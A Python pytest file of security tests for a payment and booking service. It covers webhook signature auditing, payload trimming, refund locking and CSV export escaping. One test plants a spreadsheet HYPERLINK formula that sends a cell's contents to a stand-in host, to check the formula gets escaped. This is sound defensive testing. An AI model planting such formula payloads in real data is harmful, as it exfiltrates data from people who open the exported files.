"""Güvenlik Faz 1: F1-6 (API-06) ödeme bildirimi kaydı, MON-08 geçersiz imza denetim kaydı,
F1-9 (BIZ-03) iade idempotency ve kilit, F1-18 (EXT-01) CSV formül kaçışlama."""

from __future__ import annotations

import csv
import io
import json
import threading
import time
import uuid
from datetime import datetime, timezone
from decimal import Decimal as D

import httpx
import pytest
from sqlalchemy import func, select

from app.errors import Conflict, DomainError
from app.models import AuditLog, Booking, DriverPayout, Payment, PaymentWebhook, Refund
from app.models.enums import RefundStatus
from app.providers.payments import PaytrProvider, get_payment_provider
from app.services import bookings
from app.services import payments as payment_service
from tests.conftest import booking_body, otp_login, pay, random_phone, staff_headers

API = "/api/v1"


def _now() -> datetime:
    return datetime.now(timezone.utc)


def _paytr() -> PaytrProvider:
    # Test değerleri: gerçek mağaza bilgisi değildir.
    return PaytrProvider(merchant_id="T1", merchant_key="test-key", merchant_salt="test-salt",
                         test_mode=True, ok_url="http://x/ok", fail_url="http://x/fail")


def _paid_booking(client):
    customer = otp_login(client, random_phone())
    r = client.post(f"{API}/me/bookings", json=booking_body(client, hours_ahead=72), headers=customer)
    assert r.status_code == 201, r.text
    code, booking_id = r.json()["booking_code"], r.json()["id"]
    pay(client, customer, code)
    return customer, code, booking_id


def _non_failed_total(db, payment_id) -> D:
    db.expire_all()
    return D(db.scalar(select(func.coalesce(func.sum(Refund.amount), 0)).where(
        Refund.payment_id == payment_id, Refund.status != RefundStatus.FAILED)))


# --- F1-6 / API-06 ------------------------------------------------------------


def test_invalid_signature_callback_does_not_store_full_payload(db):
    provider = get_payment_provider()
    oid = "SEC" + uuid.uuid4().hex[:12].upper()
    form = {"merchant_oid": oid, "status": "success", "total_amount": "100", "hash": "gecersiz"}
    form.update({f"junk{i}": "x" * 5000 for i in range(40)})
    with pytest.raises(DomainError):
        payment_service.handle_callback(db, provider, form, _now())
    db.rollback()
    rows = list(db.scalars(select(PaymentWebhook).where(PaymentWebhook.merchant_oid == oid)))
    # Geçersiz imzada payment_webhooks'a satır yazılmaz (sayaç + özet log + örneklenmiş denetim kaydı).
    assert rows == [], [len(json.dumps(r.raw_payload)) for r in rows]


def test_callback_payload_trimmed_to_known_fields(client, db):
    customer = otp_login(client, random_phone())
    code = client.post(f"{API}/me/bookings", json=booking_body(client), headers=customer).json()["booking_code"]
    r = client.post(f"{API}/me/bookings/{code}/payments", headers=customer)
    oid = r.json()["iframe_url"].rsplit("/", 1)[1]
    payment = db.scalar(select(Payment).where(Payment.merchant_oid == oid))
    provider = get_payment_provider()
    total = str(int(payment.amount * 100))
    form = {"merchant_oid": oid, "status": "success", "total_amount": total,
            "hash": provider.sign(oid, "success", total),
            "payment_type": "card", "currency": "EUR", "failed_reason_msg": "y" * 3000,
            "evil_field": "z" * 10000, "another": "q"}
    payment_service.handle_callback(db, provider, form, _now())
    db.commit()
    db.expire_all()
    assert db.get(Payment, payment.id).status.value == "odendi"  # geçerli davranış bozulmadı
    hook = db.scalar(select(PaymentWebhook).where(PaymentWebhook.merchant_oid == oid))
    assert hook is not None and hook.signature_valid is True
    assert "evil_field" not in hook.raw_payload and "another" not in hook.raw_payload
    assert hook.raw_payload["hash"] == "***"
    assert hook.raw_payload["payment_type"] == "card"
    assert all(len(str(v)) <= 255 for v in hook.raw_payload.values())


def test_invalid_webhook_signature_audited(client, db, monkeypatch):
    provider = _paytr()
    monkeypatch.setattr("app.api.payments.get_payment_provider", lambda: provider)
    # TestClient istekleri tek IP'den gelir; örnekleme sınırı bu testi başka testlerin olaylarına bağlamasın.
    monkeypatch.setattr(payment_service, "INVALID_SIG_AUDIT_PER_IP", 10_000, raising=False)
    monkeypatch.setattr(payment_service, "INVALID_SIG_AUDIT_GLOBAL", 10_000, raising=False)
    oid = "SEC" + uuid.uuid4().hex[:12].upper()
    r = client.post(f"{API}/payments/paytr/callback",
                    data={"merchant_oid": oid, "status": "success", "total_amount": "100", "hash": "gecersiz"})
    assert r.status_code == 400
    assert r.text != "OK"
    db.expire_all()
    entry = db.scalar(select(AuditLog).where(AuditLog.action == "security.webhook.invalid_signature",
                                             AuditLog.entity_id == oid))
    assert entry is not None
    assert entry.ip  # kaynak IP saklanır
    assert entry.changes["merchant_oid"] == oid
    assert db.scalar(select(PaymentWebhook).where(PaymentWebhook.merchant_oid == oid)) is None


def test_invalid_signature_audit_is_sampled_per_ip(db):
    """Sahte bildirim seli değiştirilemez denetim tablosunu da şişirmesin: IP başına dakikada sınırlı kayıt."""
    provider = get_payment_provider()
    ip = f"2001:db8::{uuid.uuid4().hex[:4]}"
    for _ in range(payment_service.INVALID_SIG_AUDIT_PER_IP + 5):
        with pytest.raises(DomainError):
            payment_service.handle_callback(db, provider, {"merchant_oid": "X", "hash": "gecersiz"}, _now(), ip=ip)
        db.rollback()
    count = db.scalar(select(func.count()).select_from(AuditLog).where(
        AuditLog.action == "security.webhook.invalid_signature", AuditLog.ip == ip))
    # Dakika sınırı döngü sırasında dönerse iki pencere sayılabilir.
    assert 1 <= count <= 2 * payment_service.INVALID_SIG_AUDIT_PER_IP < payment_service.INVALID_SIG_AUDIT_PER_IP + 5


def test_callback_rejects_oversized_body(client, db, monkeypatch):
    provider = _paytr()
    monkeypatch.setattr("app.api.payments.get_payment_provider", lambda: provider)
    oid = "SEC" + uuid.uuid4().hex[:12].upper()
    data = {"merchant_oid": oid, "status": "success", "total_amount": "100", "hash": "gecersiz",
            "pad": "p" * 200_000}
    r = client.post(f"{API}/payments/paytr/callback", data=data)
    assert r.status_code == 413
    db.expire_all()
    assert db.scalar(select(PaymentWebhook).where(PaymentWebhook.merchant_oid == oid)) is None


# --- F1-9 / BIZ-03 ------------------------------------------------------------


def test_refund_timeout_marks_unknown_not_failed(client, db, monkeypatch):
    _, code, _ = _paid_booking(client)
    booking = db.scalar(select(Booking).where(Booking.booking_code == code))
    payment = bookings.paid_payment(db, booking, lock=True)
    paytr = _paytr()
    sent: list[dict] = []

    def timeout_post(url, data=None, timeout=None):
        sent.append(dict(data))
        raise httpx.ReadTimeout("okuma zaman aşımı")

    monkeypatch.setattr(httpx, "post", timeout_post)
    refund = Refund(payment_id=payment.id, amount=D("10.00"), reason="test iadesi", refund_percent=5)
    db.add(refund)
    db.flush()
    bookings.execute_refund(db, refund, payment, paytr)
    db.commit()
    db.expire_all()
    stored = db.get(Refund, refund.id)
    # Sağlayıcı iadeyi işlemiş olabilir: kayıt FAILED değil, belirsiz kalır ve kalan tutardan düşülür.
    assert stored.status is not RefundStatus.FAILED
    assert stored.status.value == "belirsiz"
    assert bookings.refundable_amount(db, db.get(Payment, payment.id)) == payment.amount - D("10.00")

    # Tekrar deneme aynı kaydı aynı iade referansıyla sürdürür, yeni iade açmaz.
    def ok_post(url, data=None, timeout=None):
        sent.append(dict(data))
        return httpx.Response(200, json={"status": "success", "reference_no": data.get("reference_no", "r")})

    monkeypatch.setattr(httpx, "post", ok_post)
    monkeypatch.setattr("app.api.admin.finance.get_payment_provider", lambda: paytr)
    before = db.scalar(select(func.count()).select_from(Refund).where(Refund.payment_id == payment.id))
    finance = staff_headers(client, db, ["muhasebe"])
    r = client.post(f"{API}/admin/refunds/{refund.id}/retry", headers=finance)
    assert r.status_code == 200, r.text
    assert r.json()["status"] == "tamamlandi"
    db.expire_all()
    assert db.scalar(select(func.count()).select_from(Refund).where(Refund.payment_id == payment.id)) == before
    assert len(sent) == 2
    assert sent[0].get("reference_no") and sent[0]["reference_no"] == sent[1]["reference_no"]


def test_refund_connect_error_marks_failed():
    """Bağlantı hiç kurulamadıysa istek sağlayıcıya ulaşmamıştır: FAILED güvenlidir, tekrar denenebilir."""
    paytr = _paytr()
    orig = httpx.post
    try:
        def refuse(url, data=None, timeout=None):
            raise httpx.ConnectError("bağlantı reddedildi")
        httpx.post = refuse
        result = paytr.refund("OID1", D("5.00"), reference="REF1")
    finally:
        httpx.post = orig
    assert result.ok is False
    assert getattr(result, "unknown", False) is False


def _failed_full_refund(client, db, monkeypatch, booking_id):
    """Sahte sağlayıcı iadeyi reddeder; tam tutarlı FAILED iade kaydı oluşur."""
    ops = staff_headers(client, db, ["operasyon"])
    provider = get_payment_provider()
    monkeypatch.setattr(provider, "fail_refunds", True)
    booking = db.get(Booking, uuid.UUID(booking_id))
    payment = bookings.paid_payment(db, booking)
    db.rollback()
    r = client.post(f"{API}/admin/bookings/{booking_id}/refund", headers=ops,
                    json={"amount": f"{payment.amount:.2f}", "reason": "deneme tam iade"})
    assert r.status_code == 200, r.text
    assert r.json()["status"] == "basarisiz"
    monkeypatch.setattr(provider, "fail_refunds", False)
    return payment, r.json()["id"]


def _spy_refunds(monkeypatch):
    provider = get_payment_provider()
    calls: list[tuple] = []
    original = type(provider).refund

    def spy(merchant_oid, amount, *args, **kwargs):
        calls.append((merchant_oid, amount))
        return original(provider, merchant_oid, amount, *args, **kwargs)

    monkeypatch.setattr(provider, "refund", spy)
    return calls


def _retry_in_thread(client, finance, refund_id):
    results: list = []
    t = threading.Thread(target=lambda: results.append(
        client.post(f"{API}/admin/refunds/{refund_id}/retry", headers=finance)))
    t.start()
    return t, results


def test_retry_refund_locks_payment_and_rechecks_remaining(client, db, monkeypatch):
    _, _, booking_id = _paid_booking(client)
    payment, refund_id = _failed_full_refund(client, db, monkeypatch, booking_id)
    finance = staff_headers(client, db, ["muhasebe"])
    calls = _spy_refunds(monkeypatch)
    from app.db import SessionLocal

    with SessionLocal() as holder:
        holder.scalar(select(Payment).where(Payment.id == payment.id).with_for_update())
        t, results = _retry_in_thread(client, finance, refund_id)
        time.sleep(1.5)
        # Ödeme satırı başka bir işlemde kilitliyken tekrar deneme sağlayıcıyı çağırmamalı.
        called_while_locked = list(calls)
        holder.rollback()
    t.join(timeout=20)
    assert called_while_locked == []
    assert results and results[0].status_code == 200, results and results[0].text


def test_concurrent_retry_and_staff_refund_do_not_exceed_paid(client, db, monkeypatch):
    _, _, booking_id = _paid_booking(client)
    payment, refund_id = _failed_full_refund(client, db, monkeypatch, booking_id)
    finance = staff_headers(client, db, ["muhasebe"])
    from app.db import SessionLocal

    with SessionLocal() as staff_tx:
        # Eşzamanlı elle tam iade: ödeme satırını kilitler, kalan tutarı ayırır, henüz commit etmemiştir.
        locked = staff_tx.scalar(select(Payment).where(Payment.id == payment.id).with_for_update())
        staff_tx.add(Refund(payment_id=locked.id, amount=locked.amount, reason="eşzamanlı elle iade",
                            refund_percent=100, status=RefundStatus.PENDING))
        staff_tx.flush()
        t, results = _retry_in_thread(client, finance, refund_id)
        time.sleep(1.5)
        staff_tx.commit()
    t.join(timeout=20)
    assert results, "tekrar deneme yanıt vermedi"
    assert _non_failed_total(db, payment.id) <= payment.amount
    assert results[0].status_code == 409, results[0].text


def test_cancel_commit_failure_does_not_double_refund(client, db, monkeypatch):
    _, code, _ = _paid_booking(client)
    calls = _spy_refunds(monkeypatch)
    provider = get_payment_provider()
    from app.db import SessionLocal

    with SessionLocal() as s1:
        b = s1.scalar(select(Booking).where(Booking.booking_code == code))
        bookings.cancel_booking(s1, b, provider=provider, actor_id=None, reason="plan değişti", now=_now(), ip=None)
        s1.rollback()  # isteğin son commit'i başarısız oldu
    with SessionLocal() as s2:
        b = s2.scalar(select(Booking).where(Booking.booking_code == code))
        try:
            bookings.cancel_booking(s2, b, provider=provider, actor_id=None, reason="tekrar", now=_now(), ip=None)
            s2.commit()
        except Conflict:
            s2.rollback()
    assert len(calls) == 1
    payment = db.scalar(select(Payment).join(Booking, Booking.id == Payment.booking_id)
                        .where(Booking.booking_code == code))
    assert _non_failed_total(db, payment.id) <= payment.amount


# --- F1-18 / EXT-01 -----------------------------------------------------------


@pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
def test_payout_csv_escapes_formula_prefix(client, db, prefix):
    from app.models import Driver

    headers = otp_login(client, random_phone(), purpose="driver", country_code=None)
    r = client.post(f"{API}/driver/register", headers=headers, json={"full_name": "Mehmet Yılmaz"})
    assert r.status_code == 201, r.text
    driver = db.get(Driver, uuid.UUID(r.json()["id"]))
    driver.full_name = f'{prefix}HYPERLINK("http://ornek.invalid/?x="&A1,"tikla")'
    driver.iban = f"{prefix}1+1"
    payout = DriverPayout(driver_id=driver.id, total_try=D("10.00"))
    db.add(payout)
    db.commit()
    finance = staff_headers(client, db, ["muhasebe"])
    resp = client.get(f"{API}/admin/payouts/export.csv", headers=finance)
    assert resp.status_code == 200
    rows = list(csv.reader(io.StringIO(resp.text), delimiter=";"))
    row = next(x for x in rows if x and x[0] == str(payout.id))
    assert row[1].startswith("'" + prefix), repr(row[1])
    assert row[2].startswith("'" + prefix), repr(row[2])
    # Diğer hücreler kaçışlanmadan kalır.
    assert row[3] == "10.00"
    # Test verisi başka testlerin dışa aktarımını etkilemesin.
    db.delete(payout)
    db.commit()
